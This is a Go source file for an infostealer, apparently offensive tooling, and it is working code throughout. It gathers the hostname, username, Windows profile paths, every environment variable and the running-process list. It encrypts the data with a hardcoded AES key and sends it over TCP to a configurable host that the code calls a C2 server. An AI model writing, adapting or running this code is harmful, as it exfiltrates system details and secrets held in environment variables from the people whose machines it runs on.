package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"strings"
	"os/exec"
	"time"
)

type SystemData struct {
	Timestamp   int64             `json:"timestamp"`
	Hostname    string            `json:"hostname"`
	Username    string            `json:"username"`
	ComputerName string           `json:"computername"`
	UserProfile string            `json:"userprofile"`
	SystemRoot  string            `json:"systemroot"`
	ProgramFiles string           `json:"programfiles"`
	LocalIPs    []string          `json:"local_ips"`
	CurrentDir  string            `json:"current_dir"`
	Environment map[string]string `json:"environment"`
	Processes   []string          `json:"processes"`
}

var encryptionKey []byte

func init() {
	key := "PWNEXE_SECRET_KEY_2024"
	hash := make([]byte, 32)
	for i := 0; i < 32; i++ {
		hash[i] = key[i%len(key)]
	}
	encryptionKey = hash
}

func encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func collectSystemData() *SystemData {
	data := &SystemData{
		Timestamp:   time.Now().Unix(),
		Environment: make(map[string]string),
	}
	
	data.Hostname, _ = os.Hostname()
	data.Username = os.Getenv("USERNAME")
	data.ComputerName = os.Getenv("COMPUTERNAME")
	data.UserProfile = os.Getenv("USERPROFILE")
	data.SystemRoot = os.Getenv("SYSTEMROOT")
	data.ProgramFiles = os.Getenv("PROGRAMFILES")
	data.CurrentDir, _ = os.Getwd()
	
	for _, env := range os.Environ() {
		pair := strings.SplitN(env, "=", 2)
		if len(pair) == 2 {
			data.Environment[pair[0]] = pair[1]
		}
	}
	
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					data.LocalIPs = append(data.LocalIPs, ipnet.IP.String())
				}
			}
		}
	}
	
	procs := []string{}
	if runtime.GOOS == "windows" {
		out, err := exec.Command("tasklist").Output()
		if err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				if strings.TrimSpace(line) != "" {
					procs = append(procs, line)
				}
			}
		}
	}
	data.Processes = procs
	
	return data
}

func main() {
	systemData := collectSystemData()
	
	jsonData, err := json.Marshal(systemData)
	if err != nil {
		fmt.Println("Failed to marshal data:", err)
		return
	}
	
	encryptedData, err := encrypt(jsonData)
	if err != nil {
		fmt.Println("Failed to encrypt data:", err)
		return
	}
	
	targetIP := "127.0.0.1"
	targetPort := "9000"
	
	if envIP := os.Getenv("TARGET_IP"); envIP != "" {
		targetIP = envIP
	}
	if envPort := os.Getenv("TARGET_PORT"); envPort != "" {
		targetPort = envPort
	}
	
	conn, err := net.Dial("tcp", targetIP+":"+targetPort)
	if err != nil {
		fmt.Println("Failed to connect to C2 server:", err)
		return
	}
	defer conn.Close()
	
	dataLen := len(encryptedData)
	lenBytes := make([]byte, 8)
	for i := 0; i < 8; i++ {
		lenBytes[i] = byte(dataLen >> (i * 8))
	}
	
	_, err = conn.Write(lenBytes)
	if err != nil {
		fmt.Println("Failed to send data length:", err)
		return
	}
	
	_, err = conn.Write(encryptedData)
	if err != nil {
		fmt.Println("Failed to send data:", err)
		return
	}
	
	fmt.Printf("[+] Data sent successfully to %s:%s (%d bytes)\n", targetIP, targetPort, len(encryptedData))
}
